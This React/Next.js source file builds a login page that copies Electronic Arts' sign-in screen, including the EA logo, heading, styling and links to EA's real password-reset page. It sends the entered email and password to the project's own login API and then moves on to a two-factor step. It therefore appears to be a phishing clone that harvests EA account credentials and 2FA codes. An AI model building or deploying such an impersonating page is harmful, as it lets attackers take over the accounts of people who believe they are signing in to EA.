"use client";
import React from 'react'
import Image from 'next/image';
import "@/styles/login.css";
import { zodResolver } from "@hookform/resolvers/zod"
import * as z from "zod"
import { useForm } from 'react-hook-form';
import { FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Form } from '@/components/ui/form';
import { Button } from '@/components/ui/button';
import { PasswordInput } from '@/components/ui/password-input';
import { cn } from '@/lib/utils';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { login } from '@/api/ea';

const formSchema = z.object({
  email: z.string({
    required_error: "Email address is invalid"
  }).email("Email address is invalid"),
  password: z.string().optional(),
})

const LoginPage = () => {

  const [loading, setLoading] = React.useState(false)


  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    // mode: "onBlur",
  })

  async function onSubmit(values: z.infer<typeof formSchema>) {
    setLoading(true)
    const password = form.getValues("password")
    if (!password || password === "") {
      form.setError("password", {
        type: "manual",
        message: "Password is required"
      })
      setLoading(false)

      return
    }

    const y = await login(values.email, password)

    if (!y.ok) {
      form.setError("password", {
        type: "manual",
        message: "Password is required"
      })
      setLoading(false)

      return
    }

    router.push(`/login/2fa?email=${values.email}`)
    setLoading(false)

  }

  const router = useRouter()

  return (
    <div
      className='bg-[#1d2033] w-screen h-screen p-5'
    >
      <div className='myBox mx-auto max-w-sm flex flex-col gap-6'>
        <div className=" pt-10 flex flex-col gap-y-6 items-center">
          <Image
            alt="" src="/EALogo-New.svg" width={65} height={65} />
          <p className="font-medium text-2xl text-white fontElectronics tracking-wide text-center">
            Sign in to your EA Account
          </p>
        </div>

        <div className="">
          <Form {...form}>
            <form
              onSubmit={form.handleSubmit(onSubmit)}
              className="flex flex-col gap-4">

              <FormField
                control={form.control}
                name="email"
                render={({ field, fieldState }) => (
                  <FormItem className='flex flex-col gap-0.5 '>
                    <FormLabel >PHONE OR EMAIL</FormLabel>
                    <FormControl>
                      <Input className={cn({
                        "border-red-600 hover:border-red-600": fieldState.error,
                      })} placeholder="Enter your phone or email" {...field} />
                    </FormControl>
                    <FormMessage className='' />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="password"
                render={({ field, fieldState }) => (
                  <FormItem className='flex flex-col gap-0.5 '>
                    <FormLabel>PASSWORD</FormLabel>
                    <FormControl>
                      <PasswordInput
                        className={cn({
                          "border-red-600 hover:border-red-600": fieldState.error,
                        })}
                        onFocus={() => {
                          form.resetField("password")
                        }}
                        placeholder="Enter your password" {...field} />
                    </FormControl>
                    {
                      fieldState.error && fieldState.error.type === "manual" &&
                      <div className='text-sm font-medium text-destructive tracking-wide'>
                        Your credentials are incorrect or have expired. Please try again or{" "}
                        <Link className='hover:underline text-blue-400' href="https://signin.ea.com/p/juno/resetPassword?fid=RlMwOjMuMDoyLjA6d0xYZVFFVzRMUERYWnExaWg2NGQ2WFVCOnF2cWE0&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fhide_create%3Dtrue%26display%3Dweb2%252Flogin%26scope%3Dbasic.identity%2Boffline%2Bsignin%2Bbasic.entitlement%2Bbasic.persona%26release_type%3Dprod%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.ea.com%252Fea-sports-fc%252Fultimate-team%252Fweb-app%252Fauth.html%26accessToken%3D%26locale%3Den_US%26prompt%3Dlogin%26client_id%3DFC24_JS_WEB_APP">reset your password</Link>.
                      </div>
                    }
                  </FormItem>
                )}
              />

              <span className='flex flex-row gap-4 otkcheckbox checkbox-login-first'>
                <input type="checkbox" id="rememberMe" name="rememberMe" className='w-6 h-6 bg-[#141724] rounded-sm accent-blue-500 ring-0 focus:ring-0' />
                <span className='text-white'>
                  Remember me
                </span>
              </span>

              <Button
                disabled={loading}
                type="submit" className="otkbtn otkbtn-primary fontElectronics mt-4 font-semibold">
                SIGN IN
              </Button>
            </form>
          </Form>
        </div>

        <div className='flex flex-col justify-center items-center'>
          <Link className='text-[#5288fd] hover:underline font-extralight' href="https://signin.ea.com/p/juno/resetPassword?fid=RlMwOjMuMDoyLjA6d0xYZVFFVzRMUERYWnExaWg2NGQ2WFVCOnF2cWE0&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fhide_create%3Dtrue%26display%3Dweb2%252Flogin%26scope%3Dbasic.identity%2Boffline%2Bsignin%2Bbasic.entitlement%2Bbasic.persona%26release_type%3Dprod%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.ea.com%252Fea-sports-fc%252Fultimate-team%252Fweb-app%252Fauth.html%26accessToken%3D%26locale%3Den_US%26prompt%3Dlogin%26client_id%3DFC24_JS_WEB_APP">Forgot your password?</Link>
        </div>

      </div>
    </div>
  )
}

export default LoginPage